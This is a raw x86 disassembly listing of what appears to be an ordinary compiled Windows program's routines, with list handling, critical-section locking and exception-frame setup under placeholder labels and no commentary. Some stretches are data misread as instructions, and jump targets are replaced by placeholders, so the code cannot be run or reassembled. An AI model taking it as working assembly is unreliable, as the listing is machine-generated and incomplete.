hlt
push ebx
push ebx
inc ecx
add [ ecx + esi * 4 ] bl
inc ecx
add [ 0x6d654d54 ] cl
inc ecx
add [ ebx + ebp * 4 ] ah
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
inc ecx
add [ eax ] al
stosb [ edi ]
inc ecx
add al dh
scasd [ edi ]
inc ecx
add [ ebx + esi * 4 - 0x4fd7ffbf ] dh
inc ecx
add [ ebx + ebp * 4 ] ah
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
popad
insd
mov eax eax
cmp [ edi + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x41 ] dl
add [ eax ] bl
add [ eax ] al
add ah dh
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ ebx + esi * 4 + 0x41 ] bh
add [ ecx + ebp * 4 - 0x5617ffbf ] bl
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_416699
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax + esi * 4 + 0x41 ] cl
add [ ecx + ebp * 4 - 0x4f0fffbf ] bl
inc ecx
add [ eax ] al
stosb [ edi ]
inc ecx
add al dh
scasd [ edi ]
inc ecx
add [ eax + 0x280041b1 ] ch
mov al 0x41
add [ ebx + ebp * 4 ] ah
inc ecx
add [ ecx + esi * 4 ] bl
inc ecx
add [ 0x6d654d54 ] cl
outsd
jb r-xdata
push ebx
push ebx
je r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
popad
insd
mov eax eax
cmp [ edi + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x41 ] dl
add [ eax ] bl
add [ eax ] al
add ah dh
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ ebx + esi * 4 + 0x41 ] bh
add [ ecx + ebp * 4 - 0x5617ffbf ] bl
inc ecx
add [ eax ] al
stosb [ edi ]
inc ecx
add al dh
scasd [ edi ]
inc ecx
add [ ebx + esi * 4 - 0x4fd7ffbf ] dh
inc ecx
add [ ebx + ebp * 4 ] ah
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
sub_41687c
push esi
push 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_416eec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4060bc
pop edi
pop esi
pop ebx
retn
sub_416f14
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4060a0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_416f3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4060dc
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_417034
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_418550
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403484
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403484
test al al
je r-xdata
sub_417094
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_417034
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417034
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403484
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417104
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403240
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_4183f4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_417180
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
mov eax [ esi + 0x4 ]
call sub_403270
mov eax [ esi + 0x8 ]
call sub_403270
mov eax [ esi + 0xc ]
call sub_403270
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4171c0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_418550
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4031d4
test al al
jne r-xdata
sub_417220
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_418550
mov edx eax
mov eax ebp
call sub_403484
test al al
jne r-xdata
sub_417264
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4172ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031c0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40424c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4171c0
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4183f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417306
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
sub_417324
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405260
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_417344
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_418550
mov edx edi
call sub_417324
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418550
mov edx edi
call sub_417324
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_418440
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_417324
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418440
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4173e8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_418550
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_417220
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_417434
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403240
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_417104
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4183f4
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4174a8
push ebx
push esi
push edi
push ebp
call sub_403624
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
mov eax [ esi + 0x4 ]
mov edx edi
call sub_418550
call sub_403270
inc edi
dec ebp
jne r-xdata
sub_417504
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_418550
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_417094
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_417548
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_4171c0
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_418550
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_41758c
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_41760f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4031c0
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417616
lea eax [ ebp - 0x10c ]
call sub_403fe8
retn
sub_41761c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_417504
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_417028
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_41758c
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_418550
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418550
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403484
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_417504
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418440
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4183f4
sub_417708
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418550
mov edx ebp
call sub_41730c
test al al
jne r-xdata
sub_41774c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_417104
mov edx eax
mov eax [ edi + 0x4 ]
call sub_4183f4
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418550
mov eax [ eax + 0xc ]
mov edx ebp
call sub_4185ac
test eax eax
jge r-xdata
sub_4177a8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418550
mov esi eax
mov edx ebp
mov eax esi
call sub_417344
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403270
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418440
sub_4177f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403240
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_4176e4
xor eax eax
push ebp
push sub_4178f7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4178fe
mov eax [ rw-data ]
call sub_41779c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4183f4
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_418550
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_417220
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4183f4
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_418550
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_4178fe
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_417924
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_417954
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_4176e4
xor edx edx
push ebp
push sub_4179cb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41779c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403ad0
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418550
mov edx [ ebp - 0x4 ]
call sub_4171c0
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4179e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417a48
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a4f
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
sub_417a54
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4176e4
xor eax eax
push ebp
push sub_417a9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417548
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417aa1
mov eax [ rw-data ]
call sub_41779c
retn
sub_417aa8
push ebx
push esi
mov esi eax
mov eax esi
call sub_417a54
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4179e8
sub_417ac8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4176e4
xor eax eax
push ebp
push sub_417b2d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417708
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4176f0
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b34
mov eax [ rw-data ]
call sub_41779c
retn
mov eax ebx
call sub_4031fc
mov ebx eax
sub_417b38
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4176e4
xor eax eax
push ebp
push sub_417b7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4177a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b81
mov eax [ rw-data ]
call sub_41779c
retn
sub_417b84
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4176e4
xor eax eax
push ebp
push sub_417bc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41774c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417bcd
mov eax [ rw-data ]
call sub_41779c
retn
sub_417bd0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_4176e4
xor eax eax
push ebp
push sub_417c17
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_41761c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c1e
mov eax [ rw-data ]
call sub_41779c
retn
sub_417c24
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4176e4
xor eax eax
push ebp
push sub_417c72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_4173e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c79
mov eax [ rw-data ]
call sub_41779c
retn
sub_417c84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_417cd8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
pop ebp
retn 0x8
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_417d10
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_417cd8
mov edx eax
mov eax [ rw-data ]
call sub_41888c
pop edi
pop esi
pop ebx
retn
sub_417d3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418914
mov esi eax
xor edx edx
push ebp
push sub_417da6
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418978
retn
mov edx ebx
mov eax esi
call sub_418550
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_403ad0
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417db8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418914
mov esi eax
xor edx edx
push ebp
push sub_417e22
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418978
retn
mov edx ebx
mov eax esi
call sub_418550
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403ad0
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417e34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407ee0
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417e74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_40403c
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_417eb8
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_4185ac
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_4183f4
sub_417f10
push ebx
push esi
push edi
mov esi eax
xor eax eax
